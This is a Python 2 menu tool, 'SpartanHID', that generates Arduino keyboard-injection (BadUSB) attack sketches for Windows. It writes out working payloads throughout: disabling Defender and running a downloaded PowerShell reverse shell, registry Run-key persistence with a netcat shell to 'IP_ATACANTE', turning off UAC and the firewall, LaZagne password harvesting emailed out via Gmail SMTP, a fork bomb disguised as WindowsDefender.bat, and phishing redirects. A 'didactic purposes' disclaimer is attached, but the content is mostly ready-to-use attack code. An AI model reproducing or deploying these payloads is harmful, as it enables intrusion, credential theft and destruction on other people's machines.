#!/usr/bin/python
# -*- coding: utf-8 -*-
print("""\x1b[0;34m         
                                                                                                    
                                            `.-/+oosssso+/-`                                        
                                       `-/+ssyyyyyyyyyyyyyyso/.                                     
                                   .-/osyyyyyyyyyyyyyyyyyyyyyyyo-                                   
                               `-/osyyyyyyyyyyyyyyyyyyyyyyyyyyyyyo-                                 
                            .:+syyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy+`                               
                         .:osyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyys-                              
                       `/syyyyyyyyyyyyyyyyyyyyyyyyyyyyso++++++++++++oo-                             
                        `.:oyyyyyyyyyyyyyyyyyyyyyyys///syyyyysssssossso/                            
                            .:oyyyyyyyyyyyyyyyyyyo:/ydhoosooo-shhhysooso:      `                    
                              `-+syyyyyyyyyyyyys-/dNs/ss+sdNM`dMMMMMMNmds-   ```                    
                             ``  `:oyyyyyyyyyyo.sMh:oh/yNMMMM:oMMMMMMMMMMNo```                      
                                    -syyyyyyy+.hMs-dy/mMMMMMMd.mMMMMMMMMMMMs                        
                          `         --/yyyyyo`dMs-my/NMMMMMMMMy-mMMMMMMMMMMM.                       
                                  `yMm.-yyyy.sMy.mh-NMMMMMMMMMMh:yNMMMMMMMMM/                       
                                 `dMMMy -yy/:Mm.dN.dMMMMMMMMMMMMNs/ohNNNMNNm:                       
                                 oMMMMN ::y.mM:sM+oMMMMMMMMMMMMMMMNds++++++o-            ``         
                                 hMMMMM-+/:/Mh-Mm.NMMMMMMMMMMMMMNNMMMMMMMMMM-           `           
                                 dMMMMM::m hM-hM+oMMMMMMMMMMMMNMMMMMMMMMMMNd         `              
                                 hMMMMM:+m/Mh:MN`NMMMMMMMMMMMMMMMMMMMmhs/--:         `              
                                 oMMMMM:hsNM:dMs/MMMMMMMMMMMMMMNhs+-.:+ydMMh                        
                                 ./mMMM:m/Mm:MM-dMMMMMMMMMmho:.`:+ymMMMMMMMy                        
       ``                        ys`sMM/m+N+hMd.MMMMMMmy/. `:sdMMMMMMMMMMMMy                        
     ``                          yd  oModhy:MM+sMMMNs:`    dMMMMMMMMMMMNho-                         
   ``                            yM. `mhhM.hMM-NMMh.`     sMMMMMMMMMms/.                         `  
                                 :md` `ssMsMMysNy:`     .yMMMMMMMdo/+o:                             
                                 y+hh`  .hMMm-:.      .oNMMMMMdo/odNo`                              
                                 hN/mh.  `o/`      `/yNMMMMNy:+hNMm:`                               
                   ``            yMm/Mm/       `-+hmMMMMMNs-+mMMMm-`                                
                 ``              +MM-MMm      omNMMMMMMMd-:dMMMMN-                                  
               `                 `mM-MNd      mMMMMMMMMs`+NMMMMMo                                   
              `                   :d/MMd     `MMMMMMMMo oMMMMMMM.                                   
                                   :yMMd     :MMMMMMMy /MMMMMMmy                                    
                                    mMMh     sMMMMMMm`.NMMMNh/.                                     
                                    +MMh     dMMMMMM: yMNh+.                                        
                                     dMh    `MMMMMMd `h+-                                           
                                     -Ny    :MMMMMM/                                                
                                      oy    oMMMMMm                                                 
                                      `+    hMNms:`                                                 
                                            y+-       
                                            
                                            
    
 ::::::::  :::::::::      :::     :::::::::  :::::::::::     :::     ::::    ::: 
:+:    :+: :+:    :+:   :+: :+:   :+:    :+:     :+:       :+: :+:   :+:+:   :+: 
+:+        +:+    +:+  +:+   +:+  +:+    +:+     +:+      +:+   +:+  :+:+:+  +:+ 
+#++:++#++ +#++:++#+  +#++:++#++: +#++:++#:      +#+     +#++:++#++: +#+ +:+ +#+ 
       +#+ +#+        +#+     +#+ +#+    +#+     +#+     +#+     +#+ +#+  +#+#+# 
#+#    #+# #+#        #+#     #+# #+#    #+#     #+#     #+#     #+# #+#   #+#+# 
 ########  ###        ###     ### ###    ###     ###     ###     ### ###    ####                                                                                               
                                                                                                    
  \x1b[0;34m 
 \x1b[0;31m 
 This tool is created for didactic purposes and not to commit a crime. 
 Haxk.Ur does not take care of any malicious use of the tool. 
 We recommend the use in a controlled laboratory. Staff Haxk.UR
 \x1b[0;31m                
							\x1b[1;36m  by Gustavo Zaballa (Killerpop)      
							\x1b[1;36m  https://www.haxkur.ml/
							\x1b[1;36m  1.0.3V. \x1b[0;37m
      
\x1b[0;31mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\x1b[0;31m-1 \x1b[0;34mMetasploit Reverse Shell					 \x1b[0;31m-6 \x1b[0;34mForkBomb  
\x1b[0;31m-2 \x1b[0;34mPersistence Payloads						 \x1b[0;31m-7 \x1b[0;34mAdd User 
\x1b[0;31m-3 \x1b[0;34mPrivilege Escalation - PowerShell                             \x1b[0;31m-8 \x1b[0;34mDelete User 
\x1b[0;31m-4 \x1b[0;34mDisable Firewall W8 and W10                                   \x1b[0;31m-9 \x1b[0;34mPhishing 
\x1b[0;31m-5 \x1b[0;34mExtract all passwords W8 and W10                             \x1b[0;31m-10 \x1b[0;34mString Converter 
\x1b[0;31mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
""")
eleccion = int(input("\x1b[0;34mSpartanHID >>"))
#_____________________________________________________________________________
#_____________________________________________________________________________
if eleccion == 1:

  print"""
  \x1b[0;34m
               `.:/+oosssyyyso+/:-`               
             /yyyyyyyyyyyhhhhhhhhhhy+             
             +y/---/yyyyyhhhhy:---oho             
             +y-    `/yyyhhy:     /ho             
             +y-      `/yy/       /ho             
             +y-   -    ``    .   /ho             
             +y-   ss:     `/yo   /ho             
             +y-   syys   -hhho   /ho             
             +y-   syyy`  :hhho   /ho             
             +y-   syyy`  :hhho   +ho             
             +y+   syyy:::+hhho   sh+             
             `sy:  syyyyyhhhhho  +hs`             
               /yo.syyyyyhhhhho-sh/               
                `/yyyyyyyhhhhhhy+`                
                  `:syyyyhhhhy/`                  
                     -oyyhhs:                     
                       .++-
  
         \x1b[0;31mUpload your payload to a server 
"""
  import re 
  print
  servidor = raw_input("\x1b[0;34mURL: >> ")
  servidor_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, servidor_reem.keys())))  
  new_servidor = regex.sub(lambda x: str(servidor_reem[x.string[x.start() :x.end()]]), servidor)
  print 
  one_cade1 = """Keyboard.print("powershell Set/MpPreference /DisableRealtimeMonitoring $true ^^ powershell /nop /c @iex*New/Object Net.WebClient(.DownloadString*-"""
  one_cade2 = (new_servidor)
  one_cade3 = """-(@");"""

  print """
  \x1b[0;31m//Metasploit Reverse Shell
  
  #include "Keyboard.h"
void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell start/process cmd /verb runas");

  typeKey(KEY_RETURN);

  delay(3000);

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(3000);"""
  print
  one_concaty ="  {0}{1}{2}"
  print one_concaty.format(one_cade1, one_cade2, one_cade3)
  print"""

typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""

  
#_______________________________________________________________________________
#_______________________________________________________________________________
elif eleccion == 2:
  print """
  \x1b[0;37mUpload NCat to a server
  
\x1b[0;31m//Persistence Payloads
\x1b[0;1;37m____________________________

\x1b[1;1;32mejecutor.vbs:

\x1b[1;31mset objshell = createobject("wscript.shell")
objshell.run "c:\windows\system32\orden.bat",vbhide
\x1b[0;1;37m____________________________

\x1b[1;1;32mpersist.bat:

\x1b[1;31mreg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "tskname" /t REG_SZ /d "C:\windows\system32\ejecutor.vbs" /f 

\x1b[0;1;37m____________________________

\x1b[1;1;32morden.bat:

\x1b[1;31mnc -d -e cmd.exe IP_ATACANTE PORT

\x1b[0;1;37m____________________________ 

\x1b[1;1;32mdes_uac.bat

\x1b[1;31mreg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

\x1b[0;1;37m____________________________ 
  
}"""
#________________________________________________________________________
elif eleccion == 3:
  print """
\x1b[0;31m//Privilege Escalation - PowerShell

#include <Keyboard.h>
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
void setup() {
pe();
}
void loop() {
}
void pe() {
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell Start/Process powershell /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.end();
  """
#_____________________________________________________________
elif eleccion == 4:
  print """
\x1b[0;31m//Disable Firewall W8,W10

#include <Keyboard.h>
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
void setup() {
df();
}
void loop() {
}
void df(){
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("netsh advfirewall set currentprofile state off");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  Keyboard.end();
  """
#________________________________________________________________
elif eleccion == 5:
  print """
\x1b[0;31m//Extract all passwords

  \x1b[0;31mFACEBOOK   TWITTER   WiFi_Networks   PUTTY     CHROME   PIDGIN   OpenSSH   FILEZILLA 

  FIREFOX    OPERA     WINSCP	       OUTLOOK   SKYPE    FIREFOX  IE        APACHE

  CoreFTP    JITSI     SQLdeveloper    THUNDERBIRD    

  \x1b[0;32m1.- Download LAZAGNE.EXE : \x1b[0;31mhttps://github.com/AlessandroZ/LaZagne/releases/

  \x1b[0;32m2.- Create a file called exec.ps1 (save with extension .ps1) with the following content:

  \x1b[0;32m./lazagne.exe all -v >> passwords.txt; powershell -ExecutionPolicy Bypass ./power_mail.ps1; del lazagne.exe; del power_mail.ps1; del passwords.txt; del exec.ps1

  \x1b[0;32m3.- Create a file called power_mail.ps1 (Gsave with extension .ps1) with the following content:

 \x1b[0;31m$SMTPServer = 'smtp.gmail.com'
  $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
  $SMTPInfo.EnableSsl = $true
  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('tucorreo@gmail.com', 'TuPassword');
  $ReportEmail = New-Object System.Net.Mail.MailMessage
  $ReportEmail.From = 'tucorreo@gmail.com' 
  $ReportEmail.To.Add('tucorreo@gmail.com')
  $ReportEmail.Subject = 'REPORTE'
  $ReportEmail.Body = 'Reporte de passwords'
  $ReportEmail.Attachments.Add('c:\windows\system32\passwords.txt')
  $SMTPInfo.Send($ReportEmail)

  \x1b[0;32m*** You must upload the files to the same server *** """
  import re
  print 
  laza = raw_input("\x1b[0;34mmenter the path of lazagne.exe: >> ")
  laza_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, laza_reem.keys())))  
  new_laza = regex.sub(lambda x: str(laza_reem[x.string[x.start() :x.end()]]), laza)
  print 

  arch_exec = raw_input("\x1b[0;34mmenter the path ofE exec.ps1: >> ")
  exec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, exec_reem.keys())))  
  new_exec = regex.sub(lambda x: str(exec_reem[x.string[x.start() :x.end()]]), arch_exec)
  print

  mail = raw_input("\x1b[0;34menter the path of_mail.ps1: >> ")
  mail_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, mail_reem.keys())))  
  new_mail = regex.sub(lambda x: str(mail_reem[x.string[x.start() :x.end()]]), mail)

  five_start = """Keyboard.print("$down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade1 = (new_laza) 
  five_cade2 = """-< $file ) -lazagne.exe-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade3 = (new_mail)
  five_cade4 = """-< $file ) -power?mail.ps1-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  five_cade5 = (new_exec)
  five_cade6 = """-< $file ) -exec.ps1-< $down.DownloadFile*$url,$file(");"""
  print """
 

    \x1b[0;1;37m#include "Keyboard.h"

    void typeKey(uint8_t key)
    {
      Keyboard.press(key);
      delay(50);
      Keyboard.release(key);
    }

    /* Init function */
    void setup()
    {
      // Begining the Keyboard stream
      Keyboard.begin();

      // Wait 500ms
      delay(500);

      delay(3000);

      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_ESC);
      Keyboard.releaseAll();

      delay(500);

      Keyboard.print("powershell");

      delay(500);

      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();

      delay(3000);

      typeKey(KEY_LEFT_ARROW);

      typeKey(KEY_RETURN);

      delay(4000);"""
  print
  five_concaty ="      {0}{1}{2}{3}{4}{5}{6}"
  print five_concaty.format(five_start, five_cade1, five_cade2, five_cade3, five_cade4, five_cade5, five_cade6)
  print"""

      typeKey(KEY_RETURN);

      delay(9000);

      Keyboard.print("powershell /ExecutionPolicy Bypass .&exec.ps1< exit");

      typeKey(KEY_RETURN);

      // Ending stream
      Keyboard.end();
    }

    /* Unused endless loop */
    void loop() {} """
#__________________________________________
elif eleccion == 6:
  print """
\x1b[0;31m//ForkBomb
#include <Keyboard.h>
char enter= KEY_RETURN;
char ctrl= KEY_LEFT_CTRL;
void setup(){
  qf();
}
void loop(){
}
void qf() {
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(500);
  Keyboard.print("cd %USERPROFILE%");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.print("cd Documents");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.print("erase &Q WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.print("copy con WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.print("%0`%0");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.press(ctrl);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.print("WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  Keyboard.end();
}"""
#________________________________________________________
elif eleccion == 7:
  import re
  print 
  user_name = raw_input("\x1b[0;34mUser>> ")
  reemplx = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplx.keys())))  
  new_cad = regex.sub(lambda x: str(reemplx[x.string[x.start() :x.end()]]), user_name)
  print 

  user_pass = raw_input("\x1b[0;34mPass>> ")
  reemplxa = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplxa.keys())))  
  new_userpass = regex.sub(lambda x: str(reemplxa[x.string[x.start() :x.end()]]), user_pass)
  print

  cade1 = 'Keyboard.print("'
  cade2 = (new_userpass)
  cade3 = """");"""

  print """
  
\x1b[0;31m//Add User
#include "Keyboard.h"

    void typeKey(uint8_t key)
    {
      Keyboard.press(key);
      delay(50);
      Keyboard.release(key);
    }

    /* Init function */
    void setup()
    {
      // Begining the Keyboard stream
      Keyboard.begin();

      // Wait 500ms
      delay(500);

      delay(3000);

      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();

      delay(500);

      Keyboard.print("powershell Start/Process cmd /Verb runAs");

      typeKey(KEY_RETURN);

      delay(3000);

      typeKey(KEY_LEFT_ARROW);

      typeKey(KEY_RETURN);

      delay(2000);

      Keyboard.print("net user""",

  print (new_cad),

  print """}");"""
  print
  print """      typeKey(KEY_RETURN);"""
  print
  concaty ="      {0}{1}{2}"
  print concaty.format(cade1, cade2, cade3)
  print
  print """      typeKey(KEY_RETURN);

      delay(300);"""
  print
  print concaty.format(cade1, cade2, cade3)
  print
  print"""      typeKey(KEY_RETURN);

      delay(100);

      Keyboard.print("exit");

      typeKey(KEY_RETURN);

      // Ending stream
      Keyboard.end();
    }

    /* Unused endless loop */
    void loop() {} """
#___________________________________________________
elif eleccion == 9:
    print """
\x1b[0;31mPhishing chrome attack.
"""
    print
    import re
    ten_serv = raw_input("\x1b[0;34mUrl site:>> ")
    ten_serv_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, ten_serv_reem.keys())))  
    new_ten_serv = regex.sub(lambda x: str(ten_serv_reem[x.string[x.start() :x.end()]]), ten_serv)
    print 

    ten_real = raw_input("\x1b[0;34mUrl real site:>> ")
    ten_real_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
    regex = re.compile("(%s)" % "|".join(map(re.escape, ten_real_reem.keys())))  
    new_ten_real = regex.sub(lambda x: str(ten_real_reem[x.string[x.start() :x.end()]]), ten_real)
    print 

    ten_cade1 = (new_ten_serv)
    ten_cade2 = """");"""
    ten_cade3 = '''Keyboard.print("'''
    ten_cade4 = (new_ten_real)

    print """

\x1b[0;31m//Phishing
#include "Keyboard.h"

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup() {
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("chrome.exe""",
    ten_concaty ="{0}{1}"
    print ten_concaty.format(ten_cade1, ten_cade2)
    print"""
  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('l');
  Keyboard.releaseAll();

  delay(800);"""
    print
    ten_secconcaty ="  {0}{1}{2}"
    print ten_secconcaty.format(ten_cade3, ten_cade4, ten_cade2)
    print"""

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('f');
  Keyboard.releaseAll();

  Keyboard.print("a");

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  typeKey(KEY_TAB);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}"""
#__________________________________________
elif eleccion == 8:
  print"""
\x1b[0;31m//Delete User
#include <Keyboard.h>
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
void setup(){
  du();
}
void loop(){
}
void du() {
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("net user %USERNAME% &delete");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  Keyboard.end();
}
"""
#________________________________________________________________
elif eleccion == 10:
  print """\x1b[0;31mConvert String to spanish keys
                                              
                                  -:`             
                                  -oo/`           
                                  -oooo/.         
                    ``````````````:oooooo/.       
                   .ooooooooooooooooooooooo+-     
                   .ooooooooooooooooooooooooo+-   
              /:   .ooooooooooooooooooooooooo/.   
           `/hd+   .ooooooooooooooooooooooo:`     
         `+hddd+                  -ooooo+:`       
       .odddddd+                  -ooo+:`         
     .oddddddddddddddddddddddd-   -o+-            
   -sddddddddddddddddddddddddd-   --              
   /hddddddddddddddddddddddddd-                   
     :yddddddddddddddddddddddd-                   
       :yddddddo..............`                   
         -sdddd+                                  
           .odd+                                  
             .o/           
"""
  print
  print
  import re  
  cadena = raw_input("\x1b[0;34minsert string>> ")  
  reemplazo = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","|" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, reemplazo.keys())))  
  nueva_cadena = regex.sub(lambda x: str(reemplazo[x.string[x.start() :x.end()]]), cadena) 
  print 
  print
  print """\x1b[0;34m:""", 
  print nueva_cadena
